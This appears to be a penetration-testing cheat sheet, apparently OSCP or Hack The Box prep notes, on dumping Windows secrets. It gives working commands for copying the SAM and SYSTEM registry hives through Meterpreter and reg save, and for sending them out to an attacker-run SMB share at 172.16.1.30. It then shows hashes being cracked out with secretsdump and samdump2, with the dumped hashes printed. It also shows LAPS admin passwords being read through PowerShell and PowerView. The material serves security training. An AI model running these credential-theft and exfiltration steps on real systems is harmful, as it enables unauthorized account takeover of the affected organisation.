# Dumping Secrets

If we ever come across a windows.old, it's a good idea to extract the SAM & SYSTEM files.&#x20;

If we have privileged access we can make a copy of the SAM & SYSTEM registry files.

## Extracting SAM & SYSTEM with Metasploit

```
meterpreter > download "C:\windows.old\windows\System32\SAM"
[*] Downloading: C:\windows.old\windows\System32\SAM -> /home/kali/Documents/Prep/OSCP-A/MS02/SAM
[*] Downloaded 56.00 KiB of 56.00 KiB (100.0%): C:\windows.old\windows\System32\SAM -> /home/kali/Documents/Prep/OSCP-A/MS02/SAM
[*] Completed  : C:\windows.old\windows\System32\SAM -> /home/kali/Documents/Prep/OSCP-A/MS02/SAM

```



```
meterpreter > download "C:\windows.old\windows\system32\SYSTEM"
[*] Downloading: C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Downloaded 1.00 MiB of 11.10 MiB (9.01%): C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Downloaded 2.00 MiB of 11.10 MiB (18.02%): C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Downloaded 3.00 MiB of 11.10 MiB (27.03%): C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Downloaded 4.00 MiB of 11.10 MiB (36.04%): C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Downloaded 5.00 MiB of 11.10 MiB (45.05%): C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Downloaded 6.00 MiB of 11.10 MiB (54.07%): C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Downloaded 7.00 MiB of 11.10 MiB (63.08%): C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Downloaded 8.00 MiB of 11.10 MiB (72.09%): C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Downloaded 9.00 MiB of 11.10 MiB (81.1%): C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Downloaded 10.00 MiB of 11.10 MiB (90.11%): C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Downloaded 11.00 MiB of 11.10 MiB (99.12%): C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Downloaded 11.10 MiB of 11.10 MiB (100.0%): C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM
[*] Completed  : C:\windows.old\windows\system32\SYSTEM -> /home/kali/Documents/Prep/OSCP-A/MS02/SYSTEM

```



##

## Extracting SAM & SYSTEM with reg.exe

With elevated privileges we can create a copy of SAM & SYSTEM files from the registry with reg.exe

```
reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM
```

### Exfiltrate via SMB

We can start an SMB server on our kali box with impacket's smbserver and copy the files to our local machine

```shell-session
kali@kali$ impacket-smbserver share . -smb2support
```

### copy files to kali

```powershell
copy .\SAM \\172.16.1.30\share
copy .\SYSTEM \\172.16.1.30\share
```



## Extracting Hashes with secretsdump and samdump2



### impacket-secretsdump

```shell-session
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 
                                                                                                                                                      

```



### samdump2

```shell-session
└─$ samdump2 SYSTEM SAM         
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1004:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```





## Local Administrator Password Solution (LAPS)

LAPS is a Windows service that randomizes and stores Local Admin passwords. It's granted to specific users that have access to Read / Write like regular files.

If we have access to read LAPS we can extract the password as follows:

```powershell
PS> Get-ADComputer DC01 -property 'ms-mcs-admpwd'

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : @yvkjZSgddd-t32UkJ-Z7wPL
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :


```



### PowerView

We can also view the LAPS password using PowerVIew.

```powershell
Get-DomainComputer "MachineName" -Properties 'cn','ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```
